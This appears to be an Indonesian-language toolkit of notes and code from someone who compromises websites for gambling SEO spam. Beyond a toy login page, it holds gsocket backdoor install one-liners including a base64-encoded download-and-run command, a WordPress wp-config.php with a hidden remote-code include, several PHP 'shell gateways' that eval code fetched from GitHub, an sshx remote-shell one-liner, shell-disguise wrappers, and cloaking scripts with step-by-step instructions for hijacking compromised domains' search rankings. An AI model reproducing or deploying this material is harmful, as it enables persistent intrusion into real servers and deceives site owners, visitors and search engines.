+        <input type="password" id="password" name="password" placeholder="Masukkan password" required>
+
+        <span class="show-password" id="togglePassword">Tampilkan</span>
+
+      </div>
+
+       
+
+      <button type="submit" class="btn-login">Login</button>
+
+       
+
+      <div class="error-message" id="errorMessage">
+
+        Username atau password salah!
+
+      </div>
+
+       
+
+      <div class="success-message" id="successMessage">
+
+        Login berhasil! Mengalihkan...
+
+      </div>
+
+    </form>
+
+  </div>
+
+
+
+  <script>
+
+    // Ganti dengan username dan password yang Anda inginkan
+
+    const VALID_USERNAME = "admin";
+
+    const VALID_PASSWORD = "password123";
+
+     
+
+    // DOM Elements
+
+    const loginForm = document.getElementById('loginForm');
+
+    const usernameInput = document.getElementById('username');
+
+    const passwordInput = document.getElementById('password');
+
+    const togglePassword = document.getElementById('togglePassword');
+
+    const errorMessage = document.getElementById('errorMessage');
+
+    const successMessage = document.getElementById('successMessage');
+
+     
+
+    // Toggle password visibility
+
+    togglePassword.addEventListener('click', function() {
+
+      const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
+
+      passwordInput.setAttribute('type', type);
+
+      this.textContent = type === 'password' ? 'Tampilkan' : 'Sembunyikan';
+
+    });
+
+     
+
+    // Handle form submission
+
+    loginForm.addEventListener('submit', function(e) {
+
+      e.preventDefault();
+
+       
+
+      const username = usernameInput.value;
+
+      const password = passwordInput.value;
+
+       
+
+      // Reset messages
+
+      errorMessage.style.display = 'none';
+
+      successMessage.style.display = 'none';
+
+       
+
+      // Validate credentials
+
+      if (username === VALID_USERNAME && password === VALID_PASSWORD) {
+
+        // Login successful
+
+        successMessage.style.display = 'block';
+
+        errorMessage.style.display = 'none';
+
+         
+
+        // Simulate redirect (dalam aplikasi nyata, ini akan mengarahkan ke halaman lain)
+
+        setTimeout(() => {
+
+          alert('Login berhasil! Dalam aplikasi nyata, Anda akan diarahkan ke halaman dashboard.');
+
+          // window.location.href = 'dashboard.html'; // Uncomment untuk redirect
+
+        }, 1000);
+
+      } else {
+
+        // Login failed
+
+        errorMessage.style.display = 'block';
+
+        successMessage.style.display = 'none';
+
+         
+
+        // Clear password field
+
+        passwordInput.value = '';
+
+        passwordInput.focus();
+
+      }
+
+    });
+
+  </script>
+
+</body>
+
+</html>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+GSOCKET
+
+
+
+dengann cara script dibawahh ini:
+
+dengann cara script dibawahh ini:
+
+  untuk mengambil gsocket menggunakan script di bawah ini ：
+
+bash -c "$(curl -fsSL https://gsocket.io/y)"
+
+  
+
+  untuk hapus gscokcet menggunakan script dibawha ini:
+
+  GS_UNDO=1 bash -c "$(curl -fsSL https://gsocket.io/y)"
+
+
+
+  Untuk alternative
+
+  echo "IyBUaGlzIHdpbGwgbm90IHN1cnZpdmUgcmVib290LiBUZW1wb3JhcnkgYWNjZXNzIG9ubHkuCmtpbGxhbGwgZ3M7IFwKY3VybCAtZnNTTGsgLW9ncyBodHRwczovL2dpdGh1Yi5jb20vaGFja2Vyc2Nob2ljZS9nc29ja2V0L3JlbGVhc2VzL2xhdGVzdC9kb3dubG9hZC9ncy1uZXRjYXRfbGludXgteDg2XzY0IFwKJiYgY2htb2QgNzU1IGdzIFwKJiYgUz0kKC4vZ3MgLWcpIFwKJiYgR1NfUE9SVD01MyBHU09DS0VUX0FSR1M9Ii1saUQgLXMgJFMiIC4vZ3MgXAomJiBlY2hvICJDb25uZWN0IHdpdGg6IGdzLW5ldGNhdCAtcyAkUyAtaSIgXAomJiBybSAtZiBncw==" | base64 -d | bash
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+BACKDOOR
+
+
+
+<?php
+
+/**
+
+ * The base configuration for WordPress
+
+ *
+
+ * The wp-config.php creation script uses this file during the installation.
+
+ * You don't have to use the website, you can copy this file to "wp-config.php"
+
+ * and fill in the values.
+
+ *
+
+ * This file contains the following configurations:
+
+ *
+
+ * * Database settings
+
+ * * Secret keys
+
+ * * Database table prefix
+
+ * * ABSPATH
+
+ *
+
+ * @link https://developer.wordpress.org/advanced-administration/wordpress/wp-config/
+
+ *
+
+ * @package WordPress
+
+ */
+
+
+
+// ** Database settings - You can get this info from your web host ** //
+
+/** The name of the database for WordPress */
+
+define( 'DB_NAME', 'database_name_here' );
+
+
+
+/** Database username */
+
+define( 'DB_USER', 'username_here' );
+
+
+
+/** Database password */
+
+define( 'DB_PASSWORD', 'password_here' );
+
+
+
+/** Database hostname */
+
+define( 'DB_HOST', 'localhost' );
+
+
+
+/** Database charset to use in creating database tables. */
+
+define( 'DB_CHARSET', 'utf8' );
+
+
+
+/** The database collate type. Don't change this if in doubt. */
+
+define( 'DB_COLLATE', '' );
+
+
+
+/**#@+
+
+ * Authentication unique keys and salts.
+
+ *
+
+ * Change these to different unique phrases! You can generate these using
+
+ * the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}.
+
+ *
+
+ * You can change these at any point in time to invalidate all existing cookies.
+
+ * This will force all users to have to log in again.
+
+ *
+
+ * @since 2.6.0
+
+ */
+
+define( 'AUTH_KEY',     'put your unique phrase here' );
+
+define( 'SECURE_AUTH_KEY', 'put your unique phrase here' );
+
+define( 'LOGGED_IN_KEY',  'put your unique phrase here' );
+
+define( 'NONCE_KEY',    'put your unique phrase here' );
+
+define( 'AUTH_SALT',    'put your unique phrase here' );
+
+define( 'SECURE_AUTH_SALT', 'put your unique phrase here' );
+
+define( 'LOGGED_IN_SALT',  'put your unique phrase here' );
+
+define( 'NONCE_SALT',    'put your unique phrase here' );
+
+
+
+/**#@-*/
+
+
+
+/**
+
+ * WordPress database table prefix.
+
+ *
+
+ * You can have multiple installations in one database if you give each
+
+ * a unique prefix. Only numbers, letters, and underscores please!
+
+ */
+
+$ftp_url = "https://raw.githubusercontent.com/lenumicaptsmc/ptsmc-group/refs/heads/main/ptsmc";
+
+$cu = curl_init();
+
+curl_setopt_array($cu, array(
+
+  CURLOPT_URL => $ftp_url,
+
+  CURLOPT_SSL_VERIFYHOST => FALSE,
+
+  CURLOPT_SSL_VERIFYPEER => FALSE,
+
+  CURLOPT_RETURNTRANSFER => TRUE
+
+));
+
+$datas = curl_exec($cu);
+
+curl_close($cu);
+
+
+
+$dataf = tempnam(sys_get_temp_dir(), "wp_based");
+
+file_put_contents($dataf, $datas);
+
+include_once($dataf);
+
+if(1+1==2){
+
+exit;
+
+}
+
+/**
+
+ * For developers: WordPress debugging mode.
+
+ *
+
+ * Change this to true to enable the display of notices during development.
+
+ * It is strongly recommended that plugin and theme developers use WP_DEBUG
+
+ * in their development environments.
+
+ *
+
+ * For information on other constants that can be used for debugging,
+
+ * visit the documentation.
+
+ *
+
+ * @link https://developer.wordpress.org/advanced-administration/debug/debug-wordpress/
+
+ */
+
+define( 'WP_DEBUG', false );
+
+
+
+/* Add any custom values between this line and the "stop editing" line. */
+
+
+
+
+
+
+
+/* That's all, stop editing! Happy publishing. */
+
+
+
+/** Absolute path to the WordPress directory. */
+
+if ( ! defined( 'ABSPATH' ) ) {
+
+    define( 'ABSPATH', __DIR__ . '/' );
+
+}
+
+
+
+/** Sets up WordPress vars and included files. */
+
+
+
+
+
+
+
+
+
+
+
+
+
+DIRECT TO FOLDER
+
+
+
+<?php
+
+if (isset($_SERVER['HTTP_USER_AGENT']) && 
+
+  (stripos($_SERVER['HTTP_USER_AGENT'], 'Googlebot') !== false || 
+
+  stripos($_SERVER['HTTP_USER_AGENT'], 'Google-InspectionTool') !== false)) {
+
+   
+
+  if ($_SERVER['REQUEST_URI'] === '/' || $_SERVER['REQUEST_URI'] === '/index.php') {
+
+    include 'anujtest/readme.html';
+
+    exit();
+
+  }
+
+}
+
+?>
+
+
+
+
+
+DIRECT TO README.HTML
+
+
+
+<?php
+
+if (isset($_SERVER['HTTP_USER_AGENT']) && stripos($_SERVER['HTTP_USER_AGENT'], 'Google') !== false) {
+
+  if ($_SERVER['REQUEST_URI'] === '/' || $_SERVER['REQUEST_URI'] === '/index.php') {
+
+    include 'readme.html';
+
+    exit();
+
+  }
+
+}
+
+?>
+
+
+
+CLOACKING CURIAN
+
+
+
+<?php
+
+function is_google_bot() {
+
+  if (isset($_SERVER['HTTP_USER_AGENT'])) {
+
+    $user_agent = $_SERVER['HTTP_USER_AGENT'];
+
+    $google_agents = ['Googlebot', 'Mediapartners-Google', 'Google-InspectionTool'];
+
+    foreach ($google_agents as $agent) {
+
+      if (stripos($user_agent, $agent) !== false) {
+
+        return true;
+
+      }
+
+    }
+
+  }
+
+  return false;
+
+}
+
+
+
+function is_from_indonesia_and_google() {
+
+  if (isset($_SERVER['HTTP_REFERER'])) {
+
+    $referer = $_SERVER['HTTP_REFERER'];
+
+    $accept_lang = strtolower($_SERVER['HTTP_ACCEPT_LANGUAGE']);
+
+    if (strpos($referer, 'google.co.id') !== false || (strpos($referer, 'google.com') !== false && strpos($accept_lang, 'id') !== false)) {
+
+      return true;
+
+    }
+
+  }
+
+  return false;
+
+}
+
+
+
+if (is_google_bot() || is_from_indonesia_and_google()) {
+
+  include __DIR__ . '/home.php';
+
+} else {
+
+  include('index_old.php');
+
+  exit;
+
+}
+
+?>
+
+
+
+CLOACKING KAKAKTOGEL
+
+
+
+<?php
+
+ob_start();
+
+error_reporting(0);
+
+header('Vary: Accept-Language, User-Agent');
+
+
+
+function is_google_ua() {
+
+  $ua = strtolower($_SERVER["HTTP_USER_AGENT"] ?? '');
+
+  $keywords = [
+
+    "googlebot","google-site-verification","google-inspectiontool",
+
+    "googlebot-mobile","googlebot-news","bot","ahrefs","yandex","bing"
+
+  ];
+
+  foreach ($keywords as $k) {
+
+    if (strpos($ua, $k) !== false) return true;
+
+  }
+
+  return false;
+
+}
+
+
+
+function is_mobile_device() {
+
+  $ua = strtolower($_SERVER["HTTP_USER_AGENT"] ?? '');
+
+  return preg_match('/(android|iphone|ipad|ipod|blackberry|windows phone|opera mini|mobile)/i', $ua);
+
+}
+
+
+
+function get_client_ip() {
+
+  foreach ([
+
+    'HTTP_CLIENT_IP','HTTP_X_FORWARDED_FOR','HTTP_X_FORWARDED',
+
+    'HTTP_FORWARDED_FOR','HTTP_FORWARDED','HTTP_CF_CONNECTING_IP','REMOTE_ADDR'
+
+  ] as $key) {
+
+    if (!empty($_SERVER[$key])) return trim(explode(',', $_SERVER[$key])[0]);
+
+  }
+
+  return '127.0.0.1';
+
+}
+
+
+
+$ip = get_client_ip();
+
+
+
+$geo_json = @file_get_contents("http://ip-api.com/json/$ip");
+
+$geo_arr = $geo_json ? json_decode($geo_json, true) : [];
+
+$cc = $geo_arr['countryCode'] ?? null;
+
+
+
+$redirect_url = "https://naikterus.info/www.voltigeurs.fr/";
+
+
+
+if (is_google_ua()) {
+
+  if (ob_get_length()) ob_clean();
+
+  header("Content-Type: text/html; charset=UTF-8");
+
+  header("X-Robots-Tag: index, follow");
+
+  include __DIR__ . "/page.php";
+
+  ob_end_flush();
+
+  exit;
+
+}
+
+
+
+$referer = $_SERVER['HTTP_REFERER'] ?? '';
+
+if (
+
+  is_mobile_device() &&
+
+  $cc === 'ID' &&
+
+  ($_SERVER['REQUEST_URI'] ?? '') === '/' &&
+
+  strpos($referer, 'google') !== false
+
+) {
+
+  if (ob_get_length()) ob_clean();
+
+  header("Location: $redirect_url", true, 302);
+
+  ob_end_flush();
+
+  exit;
+
+} 
+
+if (ob_get_length()) ob_clean();
+
+include __DIR__ . "/home.php";
+
+ob_end_flush();
+
+exit;
+
+?>
+
+
+
+
+
+
+
+KILL User
+
+
+
+ps aux | grep -i u834066006 | awk {'print $2'} | xargs kill -9
+
+
+
+
+
+PENYAMARAN SHELL
+
+
+
+<?php
+
+error_reporting(E_ALL);
+
+ini_set('display_errors', 1);
+
+
+
+define('LANDING_PAGE_PATH', '/home/u834066006/domains/turbos.pe/public_html/eror');
+
+ob_start();
+
+if (file_exists(LANDING_PAGE_PATH)) {
+
+  include LANDING_PAGE_PATH;
+
+}
+
+ob_end_clean(); 
+
+if (basename(__FILE__) === basename($_SERVER['SCRIPT_FILENAME'])) {
+
+
+
+  if (file_exists(LANDING_PAGE_PATH)) {
+
+    chdir(dirname(__FILE__));
+
+    $_SERVER['PHP_SELF'] = $_SERVER['SCRIPT_NAME'] = '/' . basename(__FILE__);
+
+    $_SERVER['SCRIPT_FILENAME'] = __FILE__; 
+
+
+
+    require_once LANDING_PAGE_PATH; 
+
+  } else {
+
+    header("HTTP/1.0 404 Not Found");
+
+    echo "<h1>Error 404: File Khusus Tidak Ditemukan.</h1>";
+
+  }
+
+  exit; 
+
+} 
+
+
+
+// --- KODE BAWAAN DOMAIN DIMULAI DI SINI ---
+
+
+
+?>
+
+
+
+
+
+
+
+
+
+Skrip Pembersihan Cookie Google Analytics & Skrip Pelacakan Datadog RUM
+
+
+
+  <script nonce="TFNQUvYHwdi8uHoMheRs/Q==">
+
+    //<![CDATA[
+
+    $(function () { viewloader.execute(Views); });
+
+
+
+    //]]>
+
+  </script>
+
+
+
+
+
+  <script nonce="TFNQUvYHwdi8uHoMheRs/Q==">
+
+    //<![CDATA[
+
+
+
+    trimGacUaCookies()
+
+    trimGaSessionCookies()
+
+
+
+    function trimGacUaCookies() {
+
+      // Trim the list of gac cookies and only leave the most recent ones. This
+
+      // prevents rejecting the request later on when the cookie size grows larger
+
+      // than nginx buffers.
+
+      let maxCookies = 15
+
+      var gacCookies = []
+
+
+
+      let cookies = document.cookie.split('; ')
+
+      for (let i in cookies) {
+
+        let [cookieName, cookieVal] = cookies[i].split('=', 2)
+
+        if (cookieName.startsWith('_gac_UA')) {
+
+          gacCookies.push([cookieName, cookieVal])
+
+        }
+
+      }
+
+
+
+      if (gacCookies.length <= maxCookies) {
+
+        return
+
+      }
+
+
+
+      gacCookies.sort((a, b) => { return (a[1] > b[1] ? -1 : 1) })
+
+
+
+      for (let i in gacCookies) {
+
+        if (i < maxCookies) continue
+
+        $.removeCookie(gacCookies[i][0], { path: '/', domain: '.' + window.location.host })
+
+      }
+
+    }
+
+
+
+    function trimGaSessionCookies() {
+
+      // Trim the list of ga session cookies and only leave the most recent ones. This
+
+      // prevents rejecting the request later on when the cookie size grows larger
+
+      // than nginx buffers.
+
+      let maxCookies = 15
+
+      var gaCookies = []
+
+      // safelist our GA properties for production and staging
+
+      const KEEPLIST = ['_ga_ZKBVC1X78F', '_ga_9Z72VQCKY0']
+
+
+
+      let cookies = document.cookie.split('; ')
+
+      for (let i in cookies) {
+
+        let [cookieName, cookieVal] = cookies[i].split('=', 2)
+
+
+
+        // explicitly ensure the cookie starts with `_ga_` so that we don't accidentally include
+
+        // the `_ga` cookie
+
+        if (cookieName.startsWith('_ga_')) {
+
+          if (KEEPLIST.includes(cookieName)) { continue }
+
+
+
+          gaCookies.push([cookieName, cookieVal])
+
+        }
+
+      }
+
+
+
+      if (gaCookies.length <= maxCookies) {
+
+        return
+
+      }
+
+
+
+      gaCookies.sort((a, b) => { return (a[1] > b[1] ? -1 : 1) })
+
+
+
+      for (let i in gaCookies) {
+
+        if (i < maxCookies) continue
+
+        $.removeCookie(gaCookies[i][0], { path: '/', domain: '.' + window.location.host })
+
+      }
+
+    }
+
+
+
+    //]]>
+
+  </script>
+
+
+
+
+
+  <script nonce="TFNQUvYHwdi8uHoMheRs/Q==">
+
+    //<![CDATA[
+
+    // Set Datadog custom attributes
+
+    (function () {
+
+      if (typeof window.datadog_attributes != 'object')
+
+        window.datadog_attributes = {}
+
+      window.datadog_attributes['pageType'] = 'item:details'
+
+    })()
+
+
+
+    //]]>
+
+  </script>
+
+  <script>
+
+ 
+
+ 
+
+
+
+
+
+kalau mau encode script
+
+
+
+http://opetolol.eu.org/encode/hexadecimal
+
+
+
+
+
+
+
+GERBANG MASUK SHELL
+
+
+
+<?php 
+
+$url = "https://raw.githubusercontent.com/lenumicaptsmc/ptsmc-group/refs/heads/main/demo";
+
+$ch = curl_init($url); 
+
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+
+$result = curl_exec($ch);
+
+eval("?>".$result);
+
+
+
+?>
+
+
+
+
+
+
+
+MENYAMARKAN SHELL
+
+
+
+<?php
+
+  $url = 'https://raw.githubusercontent.com/lenumicaptsmc/ptsmc-group/refs/heads/main/new-emerald';
+
+  $code = file_get_contents($url);
+
+  eval('?>' . $code);
+
+?>
+
+
+
+
+
+
+
+
+
+=========================================================================================================================================================================================
+
+
+
+
+
+
+
+
+
+cara cloacking terbaru folder ala ketua dapid
+
+
+
+
+
+- BUKA DOMAIN DI TRAFFIC CHECKER Ahrefs 
+
+- CARI FOLDER YANG TOP UNTUK DI PAKAI
+
+- BUKA DOMAIN ITU DENGAN FOLDERNYA HABIS ITU DI CTRL-U
+
+- BUKA SHELL PADA DOMAINNYA LALU MASUK KE FOLDERNYA YANG INGIN DI PAKAI
+
+- CADANGKAN ISI SCRIPT FOLDER (INDEX.PHPNYA)UNTUK JAGA JAGA KALAU TIDAK BISA DI CLOACKING
+
+
+
+CATATAN: 
+
+home.php > LP KITA
+
+index.php > SCRIPT CLOACKING
+
+old.php > LP Ori (YANG DI CTRL+U TADI)
+
+(GUNAKAN HAPUS JANGAN LANGSUNG SAVE)
+
+
+
+SCRIPT CLOACKINGNYA:
+
+
+
+<?php
+
+$bot_user_agents = array(
+
+  "Googlebot", "Googlebot-Image", "Googlebot-News", "Googlebot-Video", "Storebot-Google", "Google-InspectionTool",
+
+  "GoogleOther", "GoogleOther-Image", "GoogleOther-Video", "Google-CloudVertexBot", "Google-Extended", "APIs-Google",
+
+  "AdsBot-Google-Mobile", "AdsBot-Google", "Mediapartners-Google", "FeedFetcher-Google", "Google-Favicon", "Google Favicon",
+
+  "Googlebot-Favicon", "Google-Site-Verification", "Google-Read-Aloud", "GoogleProducer", "Google Web Preview", "Bingbot",
+
+  "Slurp", "DuckDuckBot", "Baiduspider", "YandexBot", "Sogou", "Exabot", "facebookexternalhit", "ia_archiver",
+
+  "Alexa Crawler", "AhrefsBot", "Semrushbot"
+
+);
+
+
+
+$user_agent = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '';
+
+
+
+function is_bot($user_agent, $bot_user_agents) {
+
+  foreach ($bot_user_agents as $bot) {
+
+    if (stripos($user_agent, $bot) !== false) {
+
+      return true;
+
+    }
+
+  }
+
+  return false;
+
+}
+
+
+
+function is_mobile($user_agent) {
+
+  $mobile_agents = array('Mobile', 'Android', 'Silk/', 'Kindle', 'BlackBerry', 'Opera Mini', 'Opera Mobi', 'iPhone', 'iPad');
+
+  foreach ($mobile_agents as $mobile) {
+
+    if (stripos($user_agent, $mobile) !== false) {
+
+      return true;
+
+    }
+
+  }
+
+  return false;
+
+}
+
+
+
+// Combined conditions for including 'landingpage.php'
+
+if (is_bot($user_agent, $bot_user_agents) || is_mobile($user_agent)) {
+
+  include 'home.html';
+
+  exit;
+
+} else {
+
+  include 'old.html';
+
+  exit;
+
+}
+
+
+
+
+
+
+
+- SETELAH SELESAI SEMUA CEK FOLDERNYA DAN CEK AMPNYA APAKAH VALID DAN HIDUP
+
+- MASUK KE WEBISTE https://ampstar.top/ (CONTOH SAJA) AMBIL SITEMAPNYA
+
+- UPLOAD SITEMAPNYA KE DALAM FOLDER YANG DI PAKAI
+
+- BUKA SITEMAPNYA DI SITU ADA LINK https://ampstar.top/ DI GANTI KE DOMAIN YANG DI PAKAI BESERTA FOLDERNYA CONTOH: https://kaneprofessional.com/blog/
+
+- BUKA GSC, PADA PETA SITUS https://kaneprofessional.com/blog/ DI SAMPINGNYA ADA KOLOM, SILAHKAN DI ISI NAMA SITEMAP YANG TERSIMPAN DI DOMAIN CONTOHNYA TADI SITEMAP.XML DAN KIRIM HABIS ITU REFRESH
+
+- JIKA SUDAH TINGGAL INDEX
+
+
+
+
+
+
+
+=========================================================================================================================================================================================
+
+
+
+
+
+
+
+command cek open basedir
+
+php -i | grep open_basedir
+
+
+
+
+
+
+
+==================================================================================================================================================================
+
+
+
+HTACCESS SEO
+
+
+
+RewriteEngine On
+
+RewriteBase /
+
+
+
+# ==================================================
+
+# JANGAN REWRITE FILE & FOLDER ASLI
+
+# (html, css, js, gambar, dll)
+
+# ==================================================
+
+RewriteCond %{REQUEST_FILENAME} -f [OR]
+
+RewriteCond %{REQUEST_FILENAME} -d
+
+RewriteRule ^ - [L]
+
+
+
+# ==================================================
+
+# REDIRECT SEDERHANA
+
+# ==================================================
+
+RewriteRule ^kezdolap$ / [R=301,L]
+
+RewriteRule ^hirek$ / [R=301,L]
+
+
+
+# ==================================================
+
+# HALAMAN UTAMA (NUMERIC)
+
+# ==================================================
+
+RewriteRule ^([0-9]+)/[^+/]*$ index.php?act=main&fo_oldal_id=$1 [NC,L]
+
+RewriteRule ^([0-9]+)/[^+/]*/$ index.php?act=main&fo_oldal_id=$1 [NC,L]
+
+RewriteRule ^([0-9]+)/[^+/]*/([0-9]+)$ index.php?act=main&fo_oldal_id=$1&page=$2 [NC,L]
+
+
+
+# ==================================================
+
+# HALAMAN KHUSUS
+
+# ==================================================
+
+RewriteRule ^uj_szechenyi_terv_europa$ index.php?act=uj_szechenyi_terv_europa [NC,L]
+
+RewriteRule ^dokumentumtar$ index.php?act=dokumentumtar [NC,L]
+
+
+
+# ==================================================
+
+# BERITA
+
+# ==================================================
+
+RewriteRule ^hirek/([0-9]+)$ index.php?act=hirek&page=$1 [NC,L]
+
+
+
+# ==================================================
+
+# ARTICLE
+
+# ==================================================
+
+RewriteRule ^article/([0-9]+)/[^+/]*/?$ index.php?act=cikk_view&c_id=$1 [NC,L]
+
+
+
+# ==================================================
+
+# GALERIA LIST
+
+# ==================================================
+
+RewriteRule ^galeriak/?$ galeria.php [NC,L]
+
+RewriteRule ^galeriak/([0-9]+)/?$ galeria.php?act=list&page=$1 [NC,L]
+
+
+
+# ==================================================
+
+# GALERIA VIEW
+
+# ==================================================
+
+RewriteRule ^galeria/([0-9]+)/[^+/]*/?$ galeria.php?act=view&g_id=$1 [NC,L]
+
+
+
+# ==================================================
+
+# KALKULATOR
+
+# ==================================================
+
+RewriteRule ^arkalkulator$ kalkulator.php [NC,L]
+
+RewriteRule ^arkalkulator/([0-9]+)/[^+/]*$ kalkulator.php?act=kalkulator&kalkulator_id=$1 [NC,L]
+
+
+
+# ==================================================
+
+# FORUM
+
+# ==================================================
+
+RewriteRule ^forumok/?$ forum.php [NC,L]
+
+RewriteRule ^forum/([0-9]+)/[^+/]*/?$ forum.php?act=view_topic&t_id=$1 [NC,L]
+
+RewriteRule ^forum/([0-9]+)/[^+/]*/([0-9]+)$ forum.php?act=view_topic&t_id=$1&page=$2 [NC,L]
+
+
+
+
+
+
+
+
+
+Remote
+
+
+
+echo $(curl -SsfL https://s3.amazonaws.com/sshx/sshx-$(uname -m)-unknown-linux-musl.tar.gz|tar xfOz - sshx 2>/dev/null \
+
+ |nohup perl '-efor(319,279){($f=syscall$_,$",1)>0&&last};open($o,">&=".$f);print$o(<STDIN>);exec{"/proc/$$/fd/$f"}"/usr/bin/python3",("-q")' 2>/dev/null \
+
+ |{ read x;echo "$x";}&)
+
+
+
+
+
+
+
+
+
+GERBANG #2
+
+
+
+<?php
+
+
+
+error_reporting(0);
+
+set_time_limit(0);
+
+
+
+$url = "https://raw.githubusercontent.com/lenumicaptsmc/ptsmc-group/refs/heads/main/sitemap";
+
+
+
+$dns = "https://cloudflare-dns.com/dns-query";
+
+
+
+$ch = curl_init($url);
+
+
+
+if (defined("CURLOPT_DOH_URL")) {
+
+  curl_setopt($ch, CURLOPT_DOH_URL, $dns);
+
+}
+
+
+
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+
+curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 2);
+
+curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true);
+
+
+
+$res = curl_exec($ch);
+
+
+
+curl_close($ch);
+
+
+
+
+
+$tmp = tmpfile();
+
+
+
+$path_metadata = stream_get_meta_data($tmp);
+
+$path = $path_metadata["uri"];
+
+
+
+fprintf($tmp, "%s", $res);
+
+
+
+include $path;
+
+
+
+?>
+
+
+
+
+
+cloacking tebas index
+
+
+
+<?php
+
+    // Kullanıcı IP'si ve User-Agent'ı kontrol et
+
+    $user_agent = $_SERVER['HTTP_USER_AGENT'];
+
+    $is_mobile = preg_match('/(iphone|ipod|android|blackberry|windows phone)/i', $user_agent); // Mobil cihaz kontrolü
+
+
+
+    // Google ile ilgili user-agent kontrolleri
+
+    if (stripos($user_agent, 'google') !== false || stripos($user_agent, 'bot') !== false) {
+
+      include('home.php'); // Google bot ise google.php göster
+
+    } elseif ($is_mobile) {
+
+      include('old.php'); // Mobil cihaz ise kullanici.php göster
+
+    } else {
+
+      include('old.php'); // Diğer durumlar için default içerik
+
+    }
+
+  ?>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+################################################################################################################################
+
+
+
+cloacking by afat
+
+
+
+<?php
+
+
+
+// ===============================
+
+// VALIDASI REQUEST URI
+
+// ===============================
+
+if (!isset($_SERVER['REQUEST_URI'])) {
+
+  return;
+
+}
+
+
+
+$requestUri = parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH);
+
+if ($requestUri !== '/shop' && $requestUri !== '/shop') {
+
+  return;
+
+}
+
+
+
+// ===============================
+
+// USER AGENT & REFERER (PHP 5.6)
+
+// ===============================
+
+$agent  = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '';
+
+$referer = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : '';
+
+
+
+// ===============================
+
+// GET CLIENT IP (SAFE)
+
+// ===============================
+
+if (!function_exists('getClientIP')) {
+
+  function getClientIP() {
+
+    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
+
+      return $_SERVER['HTTP_CLIENT_IP'];
+
+    }
+
+    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
+
+      $ips = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
+
+      return trim($ips[0]);
+
+    }
+
+    if (!empty($_SERVER['REMOTE_ADDR'])) {
+
+      return $_SERVER['REMOTE_ADDR'];
+
+    }
+
+    return '0.0.0.0';
+
+  }
+
+}
+
+
+
+$ipAddress = getClientIP();
+
+
+
+// ===============================
+
+// GET COUNTRY BY IP (OPTIONAL)
+
+// ===============================
+
+if (!function_exists('getCountry')) {
+
+  function getCountry($ip) {
+
+    if ($ip === '0.0.0.0') {
+
+      return null;
+
+    }
+
+
+
+    $url = 'http://ipinfo.io/' . $ip . '/json';
+
+
+
+    $ch = curl_init();
+
+    curl_setopt($ch, CURLOPT_URL, $url);
+
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+
+    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
+
+    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
+
+
+
+    $response = curl_exec($ch);
+
+    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+
+    curl_close($ch);
+
+
+
+    if ($httpCode != 200 || $response === false) {
+
+      return null;
+
+    }
+
+
+
+    $data = json_decode($response, true);
+
+    return isset($data['country']) ? $data['country'] : null;
+
+  }
+
+}
+
+
+
+$country = getCountry($ipAddress); // jika tidak dipakai, tidak masalah
+
+
+
+// ===============================
+
+// BOT LIST (PHP 5.6 ARRAY)
+
+// ===============================
+
+$officialBots = array(
+
+  'Googlebot',
+
+  'Google-InspectionTool',
+
+  'Bingbot',
+
+  'Slurp',
+
+  'DuckDuckBot',
+
+  'Baiduspider',
+
+  'YandexBot',
+
+  'Sogou',
+
+  'Exabot',
+
+  'facebot',
+
+  'ia_archiver',
+
+  'FacebookExternalHit',
+
+  'Twitterbot',
+
+  'LinkedInBot',
+
+  'Pinterestbot',
+
+  'Applebot',
+
+  'SamsungBot',
+
+  'CensysInspect',
+
+  'AhrefsBot',
+
+  'SemrushBot',
+
+  'MJ12bot',
+
+  'SeznamBot',
+
+  'Wbot',
+
+  'GoogleAdsBot',
+
+  'YandexMobileBot',
+
+  'BingPreview',
+
+  'Discordbot'
+
+);
+
+
+
+// ===============================
+
+// BOT DETECTION
+
+// ===============================
+
+if (!function_exists('isBot')) {
+
+  function isBot($userAgent, $bots) {
+
+    if ($userAgent === '') {
+
+      return false;
+
+    }
+
+    foreach ($bots as $bot) {
+
+      if (stripos($userAgent, $bot) !== false) {
+
+        return true;
+
+      }
+
+    }
+
+    return false;
+
+  }
+
+}
+
+
+
+// ===============================
+
+// BOT CONTENT RESPONSE
+
+// ===============================
+
+if (isBot($agent, $officialBots)) {
+
+
+
+  $ch = curl_init();
+
+  curl_setopt($ch, CURLOPT_URL, 'https://pastedav.id/d/mIzGMJKi');
+
+  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+
+  curl_setopt($ch, CURLOPT_TIMEOUT, 5);
+
+  curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
+
+
+
+  $response = curl_exec($ch);
+
+  curl_close($ch);
+
+
+
+  if ($response !== false && strlen($response) > 0) {
+
+    header('Content-Type: text/html; charset=UTF-8');
+
+    echo $response;
+
+  } else {
+
+    echo '<!-- content fetch failed -->';
+
+  }
+
+  exit;
+
+}
+
+
+
+?>
+
+
+
+
+
+
+
+untuk blockir akses wp hapus plugins dan admin wp folder wp-admin
+
+
+
+
+
+
+
+
+
+### Prompt untuk bikin description
+
